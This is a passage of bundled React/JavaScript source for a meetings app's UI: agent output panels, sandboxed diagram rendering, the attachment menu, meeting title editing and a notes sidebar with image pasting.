	mermaidPlaceholder.setAttribute("name", "x-script-placeholder");
	mermaidPlaceholder.setAttribute("data-src", scriptOrigin + MERMAID_RUNTIME_PATH);
	head.appendChild(mermaidPlaceholder);
	const range = doc.createRange();
	range.selectNodeContents(body);
	const fragment = range.createContextualFragment(html);
	scrubModelDocument(fragment);
	body.appendChild(fragment);
	const bootstrap = doc.createElement("script");
	bootstrap.textContent = MERMAID_BOOTSTRAP_BODY;
	body.appendChild(bootstrap);
	const csp = doc.createElement("meta");
	csp.setAttribute("http-equiv", "Content-Security-Policy");
	csp.setAttribute("content", cspFor(scriptOrigin));
	head.insertBefore(csp, head.firstChild);
	return `<!DOCTYPE html>\n${doc.documentElement.outerHTML}`.replace(/<meta name="x-script-placeholder" data-src="([^"]*)">/, (_match, src) => `<script src="${src}" crossorigin="anonymous"><\/script>`);
}
// src/host/modalLayer.ts
/** Whether *el* is a modal layer: a dialog role, `aria-modal`, or an open `<dialog>`. */
function isModalLayer(el) {
	const role = el.getAttribute("role");
	if (role === "dialog" || role === "alertdialog") return true;
	if (el.getAttribute("aria-modal") === "true") return true;
	return el.tagName === "DIALOG" && el.open;
}
// src/components/AgentPanel.tsx
/**
* Whose Escape is this? The expanded panel answers only a press that starts
* inside its own card, or on the page body (nothing focused). Anything else
* belongs to its own control: the meeting title's cancel, a menu, a dialog. An
* IME composition is closing its candidate list and must yield outright.
*/
function escapeVerdictFor(e, card) {
	if (e.isComposing) return "yield";
	const target = e.target instanceof Element ? e.target : null;
	if (target === null || target === document.body || target === document.documentElement) return "take";
	if (card === null || !card.contains(target)) return "pass";
	for (let el = target; el && el !== card; el = el.parentElement) if (isModalLayer(el)) return "yield";
	return "take";
}
function AgentPanel({ agent, output, listening, chatView, edit, editSaving = false, onToggleListening, onToggleChatView, onSendMessage, onSaveOutput, onRevertOutput, expanded = false, onToggleExpanded }) {
	const ime = useImeGuard();
	const { confirm, confirmDialog } = useConfirm();
	const inputRef = useRef(null);
	const [sent, setSent] = useState([]);
	const [draft, setDraft] = useState(null);
	const isChatAgent = agent.widget_type === "chat";
	const showChat = chatView || isChatAgent;
	const editable = onSaveOutput != null && !showChat;
	const editing = draft !== null;
	const [outputError, setOutputError] = useState(null);
	const [savePending, setSavePending] = useState(false);
	const expandRef = useRef(null);
	const canExpand = onToggleExpanded != null && !isChatAgent;
	const wasExpanded = useRef(expanded);
	useEffect(() => {
		if (wasExpanded.current && !expanded) expandRef.current?.focus();
		wasExpanded.current = expanded;
	}, [expanded]);
	useEscapeLayer(expanded && onToggleExpanded != null, (e) => {
		const verdict = escapeVerdictFor(e, expandRef.current?.closest("[data-agent-panel]") ?? null);
		if (verdict === "take") onToggleExpanded?.();
		return verdict;
	}, ESCAPE_PRIORITY.flyout);
	const cardClass = `col-span-2 flex flex-col gap-2${expanded ? " flex-1 min-h-min" : ""}`;
	const saveDraft = async () => {
		if (draft === null || onSaveOutput == null) return;
		const submittedDraft = draft.text;
		setOutputError(null);
		setSavePending(true);
		try {
			await onSaveOutput(submittedDraft);
		} catch {
			setOutputError(i18nT("apps.meetings.session.minutesSaveFailed"));
			return;
		} finally {
			setSavePending(false);
		}
		setDraft((current) => current !== null && current.text === submittedDraft ? null : current);
	};
	const requestRevert = async () => {
		if (onRevertOutput == null) return;
		if (!await confirm({
			title: i18nT("apps.meetings.agentPanel.revert"),
			body: i18nT("apps.meetings.agentPanel.revertHint", { name: agent.name }),
			confirmLabel: i18nT("apps.meetings.agentPanel.revert")
		})) return;
		setOutputError(null);
		try {
			await onRevertOutput();
		} catch {
			setOutputError(i18nT("apps.meetings.session.minutesRevertFailed"));
		}
	};
	const cancelEdit = async () => {
		if (draft !== null && draft.text !== draft.seed) {
			if (!await confirm({
				title: i18nT("apps.meetings.agentPanel.discardDraft"),
				body: i18nT("apps.meetings.agentPanel.discardDraftHint"),
				confirmLabel: i18nT("apps.meetings.agentPanel.discardDraft")
			})) return;
		}
		setDraft(null);
	};
	const send = () => {
		const text = inputRef.current?.value.trim();
		if (!text) return;
		onSendMessage(text);
		setSent((prev) => [...prev, text]);
		if (inputRef.current) inputRef.current.value = "";
	};
	const header = /* @__PURE__ */ jsxs("div", {
		className: "flex items-center justify-between gap-2",
		children: [/* @__PURE__ */ jsxs("div", {
			className: "flex items-center gap-2 min-w-0",
			children: [
				/* @__PURE__ */ jsx(CardTitle, { children: agent.name }),
				canExpand && /* @__PURE__ */ jsx(Btn$1, {
					ref: expandRef,
					onClick: onToggleExpanded,
					"aria-label": expanded ? i18nT("apps.meetings.agentPanel.collapse", { name: agent.name }) : i18nT("apps.meetings.agentPanel.expand", { name: agent.name }),
					title: expanded ? i18nT("apps.meetings.agentPanel.collapse", { name: agent.name }) : i18nT("apps.meetings.agentPanel.expand", { name: agent.name }),
					children: expanded ? /* @__PURE__ */ jsx(Minimize2, { className: "lucide-inline" }) : /* @__PURE__ */ jsx(Maximize2, { className: "lucide-inline" })
				}),
				edit && !editing && /* @__PURE__ */ jsx("span", {
					className: "flex-none px-1.5 py-0.5 rounded text-[11px] bg-accent/15 border border-accent/20 text-text",
					children: i18nT("apps.meetings.agentPanel.edited")
				})
			]
		}), /* @__PURE__ */ jsxs("div", {
			className: "flex items-center gap-1",
			children: [!isChatAgent && !editing && /* @__PURE__ */ jsx(Btn$1, {
				onClick: onToggleChatView,
				"aria-label": chatView ? i18nT("apps.meetings.agentPanel.showOutput") : i18nT("apps.meetings.agentPanel.showChat"),
				title: chatView ? i18nT("apps.meetings.agentPanel.showOutput") : i18nT("apps.meetings.agentPanel.showChat"),
				children: chatView ? /* @__PURE__ */ jsx(FileText, { className: "lucide-inline" }) : /* @__PURE__ */ jsx(MessageSquare, { className: "lucide-inline" })
			}), /* @__PURE__ */ jsx(Btn$1, {
				onClick: onToggleListening,
				"aria-label": listening ? i18nT("apps.meetings.agentPanel.mute", { name: agent.name }) : i18nT("apps.meetings.agentPanel.unmute", { name: agent.name }),
				title: listening ? i18nT("apps.meetings.agentPanel.listeningHint") : i18nT("apps.meetings.agentPanel.mutedHint"),
				children: listening ? /* @__PURE__ */ jsx(Volume2, { className: "lucide-inline" }) : /* @__PURE__ */ jsx(VolumeX, { className: "lucide-inline" })
			})]
		})]
	});
	if (showChat) return /* @__PURE__ */ jsxs(Card, {
		className: cardClass,
		"data-agent-panel": agent.id,
		children: [
			header,
			/* @__PURE__ */ jsx(ui_default$2, { message: outputError }),
			/* @__PURE__ */ jsx("div", {
				className: `flex-1 min-h-[120px] ${expanded ? "contain-size " : "max-h-[320px] "}overflow-y-auto flex flex-col gap-2`,
				children: sent.length === 0 ? /* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted",
					children: i18nT("apps.meetings.agentPanel.chatEmpty", { name: agent.name })
				}) : sent.map((message, index) => /* @__PURE__ */ jsx("div", {
					className: "self-end max-w-[85%] px-3 py-1.5 rounded-2xl rounded-br-sm bg-accent/15 border border-accent/20 text-[13px] text-text break-words",
					children: message
				}, `${index}-${message.slice(0, 12)}`))
			}),
			/* @__PURE__ */ jsxs("div", {
				className: "flex items-center gap-2 pt-2 border-t border-border",
				children: [/* @__PURE__ */ jsx(Input, {
					ref: inputRef,
					type: "text",
					className: "flex-1",
					placeholder: i18nT("apps.meetings.agentPanel.messagePlaceholder", { name: agent.name }),
					"aria-label": i18nT("apps.meetings.agentPanel.messagePlaceholder", { name: agent.name }),
					...ime.bindEnter({ onEnter: send })
				}), /* @__PURE__ */ jsx(SendBtn, {
					onClick: send,
					"aria-label": i18nT("apps.meetings.agentPanel.send"),
					children: i18nT("apps.meetings.agentPanel.send")
				})]
			})
		]
	});
	if (agent.widget_type === "html") return /* @__PURE__ */ jsxs(Card, {
		className: cardClass,
		"data-agent-panel": agent.id,
		children: [header, output ? /* @__PURE__ */ jsx("iframe", {
			title: i18nT("apps.meetings.agentPanel.diagramFrameTitle", { name: agent.name }),
			srcDoc: buildSketchSrcdoc(output, typeof window === "undefined" ? "" : window.location.origin),
			sandbox: "allow-scripts",
			className: `w-full border border-border rounded-md bg-white${expanded ? " flex-1 min-h-0" : ""}`,
			style: expanded ? {
				minHeight: 340,
				transform: "translateZ(0)"
			} : {
				minHeight: 340,
				height: 340,
				transform: "translateZ(0)"
			}
		}) : /* @__PURE__ */ jsx("p", {
			className: "text-[13px] text-muted",
			children: i18nT("apps.meetings.agentPanel.awaitingOutput", { name: agent.name })
		})]
	});
	if (editing) return /* @__PURE__ */ jsxs(Card, {
		className: cardClass,
		"data-agent-panel": agent.id,
		children: [
			header,
			/* @__PURE__ */ jsx("textarea", {
				value: draft.text,
				onChange: (e) => setDraft((current) => current === null ? current : {
					seed: current.seed,
					text: e.target.value
				}),
				autoFocus: true,
				"aria-label": i18nT("apps.meetings.agentPanel.editorLabel", { name: agent.name }),
				spellCheck: true,
				className: `min-h-[280px] ${expanded ? "flex-1 resize-none" : "max-h-[520px] resize-y"} bg-transparent border border-border rounded-md outline-hidden p-3 text-[13px] leading-relaxed text-text font-body focus-ring`
			}),
			/* @__PURE__ */ jsx(ui_default$2, { message: outputError }),
			/* @__PURE__ */ jsxs("div", {
				className: "flex items-center justify-end gap-2",
				children: [/* @__PURE__ */ jsx(Btn$1, {
					onClick: () => void cancelEdit(),
					disabled: editSaving,
					children: i18nT("apps.meetings.agentPanel.cancel")
				}), /* @__PURE__ */ jsx(SendBtn, {
					onClick: saveDraft,
					disabled: editSaving,
					children: savePending ? i18nT("apps.meetings.agentPanel.saving") : i18nT("apps.meetings.agentPanel.save")
				})]
			}),
			confirmDialog
		]
	});
	return /* @__PURE__ */ jsxs(Card, {
		className: cardClass,
		"data-agent-panel": agent.id,
		children: [
			header,
			/* @__PURE__ */ jsx(ui_default$2, { message: outputError }),
			(editable || edit && onRevertOutput) && /* @__PURE__ */ jsxs("div", {
				className: "flex flex-wrap items-center justify-end gap-2 pt-2 border-t border-border",
				children: [editable && /* @__PURE__ */ jsxs(Btn$1, {
					onClick: () => setDraft({
						seed: output,
						text: output
					}),
					"aria-label": i18nT("apps.meetings.agentPanel.edit"),
					children: [/* @__PURE__ */ jsx(Pencil, { className: "lucide-inline" }), i18nT("apps.meetings.agentPanel.edit")]
				}), edit && onRevertOutput && /* @__PURE__ */ jsxs(Btn$1, {
					danger: true,
					onClick: () => void requestRevert(),
					disabled: editSaving,
					"aria-label": i18nT("apps.meetings.agentPanel.revert"),
					title: i18nT("apps.meetings.agentPanel.revertHint", { name: agent.name }),
					children: [/* @__PURE__ */ jsx(RotateCcw, { className: "lucide-inline" }), i18nT("apps.meetings.agentPanel.revert")]
				})]
			}),
			edit?.stale && /* @__PURE__ */ jsx("p", {
				className: "flex-none text-[12px] text-muted",
				children: i18nT("apps.meetings.agentPanel.staleEdit", { name: agent.name })
			}),
			/* @__PURE__ */ jsx("div", {
				"data-testid": "agent-output-pane",
				className: expanded ? "flex-1 min-h-0 contain-size overflow-y-auto" : "max-h-[min(520px,60vh)] supports-[height:100svh]:max-h-[min(520px,60svh)] overflow-y-auto",
				children: output ? /* @__PURE__ */ jsx(ui_default, { content: output }) : !edit ? /* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted",
					children: i18nT("apps.meetings.agentPanel.awaitingOutput", { name: agent.name })
				}) : null
			}),
			confirmDialog
		]
	});
}
// src/lib/offstage.ts
var OFFSTAGE = {
	display: "block",
	visibility: "hidden",
	position: "absolute",
	top: 0,
	left: 0,
	right: 0,
	bottom: 0,
	overflow: "hidden",
	pointerEvents: "none"
};
function onstage(display) {
	return {
		display,
		visibility: "visible",
		position: "relative",
		top: "auto",
		left: "auto",
		right: "auto",
		bottom: "auto",
		overflow: "visible",
		pointerEvents: "auto"
	};
}
// src/components/AgentPanelSlot.tsx
/**
* One agent panel's place in the meeting grid (#21179).
*
* Expanding a panel moves and resizes it, so the slot carries a Framer Motion
* `layout` animation: the panel slides and grows into the workspace instead of
* jumping there in one frame, and restoring plays the same motion back. A panel
* hidden by a sibling's expansion fades out before it leaves the layout.
*
* Hidden means OFFSTAGE after the fade (see ../lib/offstage), never unmounted:
* the panel may hold an unsaved minutes draft, which unmounting would drop, and
* staying laid out keeps its notes' scroll position. Reduced motion keeps the
* same end states with no animation.
*/
function AgentPanelSlot({ hidden, expanded = false, children }) {
	const transition = useReducedMotion() ? { duration: 0 } : {
		type: "spring",
		stiffness: 300,
		damping: 32
	};
	return /* @__PURE__ */ jsx(motion.div, {
		layout: true,
		"data-testid": "agent-panel-slot",
		className: `col-span-2 min-w-0 flex flex-col ${expanded ? "flex-1 min-h-0" : "min-h-0"}`,
		initial: false,
		animate: hidden ? {
			opacity: 0,
			transitionEnd: OFFSTAGE
		} : {
			...onstage("flex"),
			opacity: 1
		},
		transition,
		children
	});
}
// src/host/SimpleSelect.tsx
var HostSelect = "Select" in ui ? ui.Select : void 0;
function SimpleSelect({ style, ...props }) {
	if (HostSelect) return /* @__PURE__ */ jsx("span", {
		className: "inline-flex min-w-0",
		style,
		children: /* @__PURE__ */ jsx(HostSelect, { ...props })
	});
	const { options, optionLabels, value, onChange, clearLabel, disabled, title, className } = props;
	return /* @__PURE__ */ jsxs("select", {
		value,
		disabled,
		"aria-label": props["aria-label"],
		title,
		className: `rounded-md border border-border bg-input px-2 py-1 text-[13px] ${className ?? ""}`,
		style,
		onChange: (e) => onChange(e.target.value),
		children: [clearLabel !== void 0 && /* @__PURE__ */ jsx("option", {
			value: "",
			children: clearLabel
		}), options.map((option, i) => /* @__PURE__ */ jsx("option", {
			value: option,
			children: optionLabels?.[i] ?? option
		}, option))]
	});
}
// src/components/AgentPillBar.tsx
function AgentPillBar({ agents, enabledIds, mutedAgents, presets, defaultPreset, selectedPreset, status, attachments, attachMenuOpen, onPresetChange, onToggleAgent, onOpenSettings, onToggleAttachMenu, onAddAttachment, onRemoveAttachment }) {
	const presetNames = Object.keys(presets);
	const menuRef = useRef(null);
	const attachBtnRef = useRef(null);
	useMenuKeyboard({
		enabled: attachMenuOpen,
		containerRef: menuRef
	});
	const prevMenuOpenRef = useRef(attachMenuOpen);
	useEffect(() => {
		const wasOpen = prevMenuOpenRef.current;
		prevMenuOpenRef.current = attachMenuOpen;
		if (document.activeElement !== document.body) return;
		if (attachMenuOpen) (menuItemsOf(menuRef.current)[0] ?? attachBtnRef.current)?.focus();
		else if (wasOpen) attachBtnRef.current?.focus();
	}, [attachments, attachMenuOpen]);
	return /* @__PURE__ */ jsxs("div", {
		className: "px-4 md:px-6 py-2 border-b border-border flex flex-wrap items-center gap-2",
		children: [
			presetNames.length > 0 ? /* @__PURE__ */ jsx(SimpleSelect, {
				options: presetNames,
				optionLabels: presetNames.map((name) => name === defaultPreset ? i18nT("apps.meetings.pillBar.presetDefaultOption", { name }) : name),
				value: selectedPreset,
				onChange: onPresetChange,
				clearLabel: i18nT("apps.meetings.pillBar.noPreset"),
				"aria-label": i18nT("apps.meetings.pillBar.presetLabel"),
				style: { minWidth: 160 }
			}) : /* @__PURE__ */ jsxs(Btn$1, {
				onClick: onOpenSettings,
				children: [/* @__PURE__ */ jsx(Plus, { className: "lucide-inline" }), i18nT("apps.meetings.pillBar.createPreset")]
			}),
			/* @__PURE__ */ jsx("span", {
				className: "w-px h-5 bg-border mx-1",
				"aria-hidden": "true"
			}),
			agents.map((agent) => {
				const enabled = enabledIds.includes(agent.id);
				const muted = mutedAgents.includes(agent.id);
				const title = muted ? i18nT("apps.meetings.pillBar.agentMuted", { name: agent.name }) : enabled ? i18nT("apps.meetings.pillBar.disableAgent", { name: agent.name }) : i18nT("apps.meetings.pillBar.enableAgent", { name: agent.name });
				return /* @__PURE__ */ jsxs(Btn$1, {
					primary: enabled,
					onClick: () => onToggleAgent(agent.id, !enabled),
					"aria-pressed": enabled,
					title,
					className: `rounded-full ${enabled ? "" : "opacity-60 hover:opacity-100"}`,
					children: [
						/* @__PURE__ */ jsx(Sparkles, { className: "lucide-inline" }),
						agent.name,
						enabled && !muted && status === "active" && /* @__PURE__ */ jsx("span", {
							role: "img",
							className: "w-1.5 h-1.5 rounded-full bg-ok animate-pulse",
							"aria-label": i18nT("apps.meetings.pillBar.listening")
						})
					]
				}, agent.id);
			}),
			/* @__PURE__ */ jsx(Btn$1, {
				onClick: onOpenSettings,
				"aria-label": i18nT("apps.meetings.pillBar.manageAgents"),
				title: i18nT("apps.meetings.pillBar.manageAgents"),
				className: "rounded-full",
				children: /* @__PURE__ */ jsx(Settings2, { className: "lucide-inline" })
			}),
			/* @__PURE__ */ jsx("span", {
				className: "w-px h-5 bg-border mx-1",
				"aria-hidden": "true"
			}),
			/* @__PURE__ */ jsxs("div", {
				className: "relative",
				children: [/* @__PURE__ */ jsxs(Btn$1, {
					ref: attachBtnRef,
					onClick: onToggleAttachMenu,
					"aria-label": i18nT("apps.meetings.pillBar.manageAttachments"),
					"aria-expanded": attachMenuOpen,
					className: "rounded-full",
					children: [/* @__PURE__ */ jsx(Paperclip, { className: "lucide-inline" }), attachments.length > 0 && /* @__PURE__ */ jsx("span", {
						className: "font-medium",
						children: attachments.length
					})]
				}), attachMenuOpen && /* @__PURE__ */ jsxs(Fragment$1, { children: [/* @__PURE__ */ jsx("div", {
					className: "fixed inset-0 z-10",
					role: "presentation",
					"aria-hidden": "true",
					onClick: onToggleAttachMenu
				}), /* @__PURE__ */ jsxs("div", {
					ref: menuRef,
					className: "absolute top-full left-0 mt-1 w-64 bg-card border border-border rounded-lg shadow-lg z-20 py-1",
					role: "menu",
					tabIndex: -1,
					"aria-label": i18nT("apps.meetings.pillBar.attachmentsMenu"),
					onKeyDown: (e) => {
						if (e.key === "Escape") {
							onToggleAttachMenu();
							attachBtnRef.current?.focus();
						}
					},
					children: [attachments.length > 0 ? attachments.map((attachment, index) => /* @__PURE__ */ jsxs("div", {
						className: "flex items-center justify-between gap-2 px-3 py-1.5 text-[13px] hover:bg-bg-hover",
						children: [/* @__PURE__ */ jsx("span", {
							className: "text-text truncate",
							title: attachment.url ?? attachment.path,
							children: attachment.label
						}), /* @__PURE__ */ jsx(Btn$1, {
							danger: true,
							role: "menuitem",
							onClick: () => onRemoveAttachment(index),
							"aria-label": i18nT("apps.meetings.pillBar.removeAttachment", { label: attachment.label }),
							children: /* @__PURE__ */ jsx(X, { className: "lucide-inline" })
						})]
					}, `${attachment.label}-${index}`)) : /* @__PURE__ */ jsx("div", {
						className: "px-3 py-2 text-[13px] text-muted",
						children: i18nT("apps.meetings.pillBar.noAttachments")
					}), /* @__PURE__ */ jsx("div", {
						className: "border-t border-border mt-1 pt-1 px-2 pb-1",
						children: /* @__PURE__ */ jsxs("button", {
							type: "button",
							role: "menuitem",
							onClick: onAddAttachment,
							className: "w-full text-left px-2 py-1 text-[13px] text-accent hover:bg-bg-hover rounded cursor-pointer bg-transparent border-none",
							children: [/* @__PURE__ */ jsx(Plus, { className: "lucide-inline" }), i18nT("apps.meetings.pillBar.addLink")]
						})
					})]
				})] })]
			}),
			defaultPreset && selectedPreset === defaultPreset && /* @__PURE__ */ jsxs("span", {
				className: "ml-auto text-[12px] text-muted inline-flex items-center gap-1",
				children: [/* @__PURE__ */ jsx(Star, { className: "lucide-inline" }), i18nT("apps.meetings.pillBar.usingDefaultPreset")]
			})
		]
	});
}
// src/components/BroadcastBar.tsx
function BroadcastBar({ onSend, caption, disabled, placeholder }) {
	const ime = useImeGuard();
	const inputRef = useRef(null);
	const send = () => {
		const text = inputRef.current?.value.trim();
		if (!text) return;
		onSend(text);
		if (inputRef.current) inputRef.current.value = "";
	};
	return /* @__PURE__ */ jsxs("div", {
		className: "flex-none px-4 md:px-6 py-3 border-t border-border bg-bg",
		children: [caption && /* @__PURE__ */ jsx("div", {
			className: "text-[12px] text-muted break-words line-clamp-2 mb-2",
			"aria-live": "polite",
			"data-testid": "meetings-caption",
			children: i18nT("apps.meetings.broadcastBar.heard", { text: caption })
		}), /* @__PURE__ */ jsxs("div", {
			className: "flex items-center gap-2",
			children: [/* @__PURE__ */ jsx(Input, {
				ref: inputRef,
				type: "text",
				placeholder: placeholder ?? i18nT("apps.meetings.broadcastBar.placeholder"),
				"aria-label": placeholder ?? i18nT("apps.meetings.broadcastBar.placeholder"),
				disabled,
				className: "flex-1",
				...ime.bindEnter({ onEnter: send })
			}), /* @__PURE__ */ jsxs(SendBtn, {
				onClick: send,
				disabled,
				"aria-label": i18nT("apps.meetings.broadcastBar.send"),
				children: [/* @__PURE__ */ jsx(Send, { className: "lucide-inline" }), i18nT("apps.meetings.broadcastBar.send")]
			})]
		})]
	});
}
// src/components/MeetingTitle.tsx
function MeetingTitle({ title, onRename }) {
	const ime = useImeGuard();
	const [draft, setDraft] = useState(null);
	const [error, setError] = useState(null);
	const busy = useRef(false);
	const triggerRef = useRef(null);
	const restoreFocus = () => requestAnimationFrame(() => triggerRef.current?.focus({ preventScroll: true }));
	const close = (restore = false) => {
		setDraft(null);
		setError(null);
		if (restore) restoreFocus();
	};
	const save = (restore = false) => {
		if (draft === null || busy.current) return;
		const next = draft.trim();
		if (!next || next === title) return close(restore);
		busy.current = true;
		onRename(next).then(() => {
			setError(null);
			setDraft((d) => {
				if (d !== null && d.trim() !== next) return d;
				if (restore) restoreFocus();
				return null;
			});
		}, () => setError(i18nT("apps.meetings.session.renameFailed"))).finally(() => {
			busy.current = false;
		});
	};
	if (draft === null) return /* @__PURE__ */ jsx("h2", {
		className: "text-lg font-semibold text-text-strong min-w-0",
		children: /* @__PURE__ */ jsxs("button", {
			ref: triggerRef,
			type: "button",
			onClick: () => setDraft(title),
			className: "cursor-text flex max-w-full items-center gap-1.5 rounded-md px-1.5 hover:bg-bg-hover focus-ring",
			children: [/* @__PURE__ */ jsx("span", {
				className: "truncate",
				children: title || i18nT("apps.meetings.session.untitled")
			}), /* @__PURE__ */ jsx(Pen, {
				size: 13,
				"aria-hidden": true,
				className: "shrink-0 text-muted"
			})]
		})
	});
	return /* @__PURE__ */ jsxs("div", {
		className: "flex-1 min-w-0",
		children: [/* @__PURE__ */ jsx(Input, {
			value: draft,
			className: "w-full",
			onChange: (e) => setDraft(e.target.value),
			autoFocus: true,
			"aria-label": i18nT("apps.meetings.meeting.titleLabel"),
			...ime.bindEnter({
				onEnter: () => save(true),
				onEscape: () => close(true),
				onBlur: () => save(false)
			})
		}), /* @__PURE__ */ jsx(ui_default$2, { message: error })]
	});
}
// src/components/MeetingWorkspace.tsx
/**
* The meeting's adaptive content plane.
*
* Agent output and transcript share the page while any agent is enabled. With
* an empty roster, the transcript becomes the primary surface instead of
* leaving a blank output area beside a narrow right column.
*
* While one agent panel is expanded, the transcript column fades out and then
* goes OFFSTAGE (see ../lib/offstage): out of the flow and invisible, but still
* laid out and mounted. So its scroll position survives in every engine, and its
* own follow-new-speech logic keeps working while hidden: on restore the reader
* is where they were, or at the latest line if they were following.
*/
function MeetingWorkspace({ hasAgentPanels, expanded = false, agentPanels, transcript }) {
	const reduceMotion = useReducedMotion();
	const transition = reduceMotion ? { duration: 0 } : {
		type: "spring",
		stiffness: 300,
		damping: 32
	};
	const panelExpanded = hasAgentPanels && expanded;
	return /* @__PURE__ */ jsxs(motion.div, {
		layout: true,
		"data-testid": "meeting-workspace",
		"data-transcript-layout": panelExpanded ? "hidden" : hasAgentPanels ? "split" : "primary",
		className: "relative flex-1 min-h-0 overflow-hidden flex flex-col lg:flex-row gap-3 p-6",
		transition,
		children: [/* @__PURE__ */ jsx(AnimatePresence, {
			initial: false,
			children: hasAgentPanels && /* @__PURE__ */ jsx(motion.div, {
				layout: true,
				"data-testid": "meeting-agent-panels",
				initial: reduceMotion ? false : {
					opacity: 0,
					x: -18
				},
				animate: {
					opacity: 1,
					x: 0
				},
				exit: reduceMotion ? { opacity: 0 } : {
					opacity: 0,
					x: -18
				},
				transition,
				className: "relative flex-1 min-w-0 min-h-0 overflow-y-auto",
				children: agentPanels
			}, "agent-panels")
		}), /* @__PURE__ */ jsx(motion.div, {
			layout: true,
			"data-testid": "meeting-transcript-slot",
			transition,
			initial: false,
			animate: panelExpanded ? {
				opacity: 0,
				transitionEnd: OFFSTAGE
			} : {
				...onstage("block"),
				opacity: 1
			},
			className: hasAgentPanels ? "w-full h-[42%] min-h-[260px] lg:h-full lg:w-[360px] lg:flex-none" : "flex-1 min-w-0 min-h-0",
			children: transcript
		})]
	});
}
// src/noteText.ts
/**
* The server's ceiling on a note, `MAX_NOTE_CHARS` in the meetings backend's
* `constants.py` (a backend test holds the two equal). The client must never
* compose a longer note: the server refuses every save past it, and a refusal
* the user cannot clear by retrying would keep them in the meeting view. The
* field's `maxLength` counts UTF-16 code units, never fewer than the code points
* the server counts, so a note it admits always fits.
*/
var MAX_NOTE_CHARS = 1e5;
/**
* Insert *snippet* into *text* at *caret*, on its own line.
*
* Pasted images are block content: dropping one mid-sentence would split the
* sentence around it. Exported because the caret arithmetic is the part worth
* testing, and it is pure.
*/
function insertBlock(text, caret, snippet) {
	const at = Math.max(0, Math.min(caret, text.length));
	const before = text.slice(0, at);
	const after = text.slice(at);
	return `${before}${before === "" || before.endsWith("\n") ? "" : "\n"}${snippet}${after === "" || after.startsWith("\n") ? "" : "\n"}${after}`;
}
/** The markdown for one stored image. `alt` may be empty when a meeting is not live. */
function imageSnippet(alt, src) {
	return `![${alt}](${src})`;
}
// src/components/NoteSidebar.tsx
function NoteSidebar({ draft, dirty, loaded, updatedAt, path, saving, saveFailed, loadFailed, uploading, uploadError, onChange, onFlush, onPasteImage, onClose }) {
	const [preview, setPreview] = useState(false);
	const fieldRef = useRef(null);
	const onFlushRef = useRef(onFlush);
	onFlushRef.current = onFlush;
	useEffect(() => () => {
		onFlushRef.current();
	}, []);
	/**
	* Take an image off the clipboard and hand it to the draft hook.
	*
	* The `types.includes('text/plain')` guard is the rule ChatInput established: some
	* apps (Office on macOS notably) put an image on the clipboard ALONGSIDE the text
	* the user actually copied, and treating that as an image paste silently swallows
	* their text.
	*/
	const handlePaste = useCallback((event) => {
		const data = event.clipboardData;
		if (!data) return;
		if (Array.from(data.types).includes("text/plain")) return;
		const file = Array.from(data.items).filter((item) => item.kind === "file").map((item) => item.getAsFile()).find((candidate) => candidate != null);
		if (!file) return;
		event.preventDefault();
		onPasteImage(file, fieldRef.current?.selectionStart ?? draft.length);
	}, [draft.length, onPasteImage]);
	const readOnly = loadFailed || !loaded;
	const failure = saveFailed ? i18nT("apps.meetings.session.noteSaveFailed") : loadFailed ? i18nT("apps.meetings.note.loadFailed") : uploadError === "tooLarge" ? i18nT("apps.meetings.session.noteImageTooLarge") : uploadError === "failed" ? i18nT("apps.meetings.session.noteImageFailed") : "";
	return /* @__PURE__ */ jsxs("aside", {
		className: "flex-none w-full h-[42%] min-h-[260px] border-t border-border lg:h-full lg:w-[340px] lg:border-t-0 lg:border-l bg-bg flex flex-col overflow-hidden",
		"aria-label": i18nT("apps.meetings.note.title"),
		children: [
			/* @__PURE__ */ jsxs("div", {
				className: "flex-none px-3 py-2.5 border-b border-border flex items-center justify-between gap-2",
				children: [/* @__PURE__ */ jsxs("div", {
					className: "flex items-center gap-2 min-w-0",
					children: [/* @__PURE__ */ jsx(NotebookPen, { className: "lucide-inline text-muted" }), /* @__PURE__ */ jsx("span", {
						className: "text-[13px] font-semibold text-text-strong truncate",
						children: i18nT("apps.meetings.note.title")
					})]
				}), /* @__PURE__ */ jsxs("div", {
					className: "flex items-center gap-1",
					children: [/* @__PURE__ */ jsx(Btn$1, {
						onClick: () => {
							onFlush();
							setPreview((open) => !open);
						},
						"aria-label": preview ? i18nT("apps.meetings.note.edit") : i18nT("apps.meetings.note.preview"),
						title: preview ? i18nT("apps.meetings.note.edit") : i18nT("apps.meetings.note.preview"),
						"aria-pressed": preview,
						children: preview ? /* @__PURE__ */ jsx(Pencil, { className: "lucide-inline" }) : /* @__PURE__ */ jsx(Eye, { className: "lucide-inline" })
					}), /* @__PURE__ */ jsx(Btn$1, {
						onClick: onClose,
						"aria-label": i18nT("apps.meetings.note.close"),
						children: /* @__PURE__ */ jsx(X, { className: "lucide-inline" })
					})]
				})]
			}),
			failure ? /* @__PURE__ */ jsx(ui_default$2, {
				className: "flex-none m-3 mb-0",
				message: failure
			}) : null,
			preview ? /* @__PURE__ */ jsx("div", {
				className: "flex-1 min-h-0 overflow-y-auto p-3 text-[13px]",
				children: /* @__PURE__ */ jsx(ui_default, { content: resolveRelativeImages(draft, path) })
			}) : /* @__PURE__ */ jsx("textarea", {
				ref: fieldRef,
				value: draft,
				onChange: (e) => onChange(e.target.value),
				onBlur: onFlush,
				onPaste: handlePaste,
				placeholder: i18nT("apps.meetings.note.placeholder"),
				"aria-label": i18nT("apps.meetings.note.editorLabel"),
				readOnly,
				maxLength: MAX_NOTE_CHARS,
				spellCheck: true,
				className: "flex-1 min-h-0 resize-none bg-transparent border-none p-3 text-[13px] leading-relaxed text-text font-body placeholder:text-muted focus-ring-accent-inset"
			}),
			/* @__PURE__ */ jsx("div", {
				className: "flex-none px-3 py-2 border-t border-border text-[12px] text-muted flex items-center gap-1.5",
				children: loadFailed ? i18nT("apps.meetings.note.paused") : !loaded ? i18nT("apps.meetings.note.loading") : uploading ? /* @__PURE__ */ jsxs(Fragment$1, { children: [/* @__PURE__ */ jsx(ImagePlus, { className: "lucide-inline animate-pulse" }), i18nT("apps.meetings.note.uploading")] }) : saving ? i18nT("apps.meetings.note.saving") : dirty ? i18nT("apps.meetings.note.unsaved") : updatedAt ? i18nT("apps.meetings.note.saved") : i18nT("apps.meetings.note.hint")
			})
		]
	});
}
// src/components/TaskSidebar.tsx
var PRIORITIES = [
	"high",
	"medium",
	"low"
];
function priorityBadge(priority) {
	if (priority === "high") return "err";
	if (priority === "medium") return "warn";
	return "muted";
}
/**
* A field the extractor agent may revise while the user edits it.
*
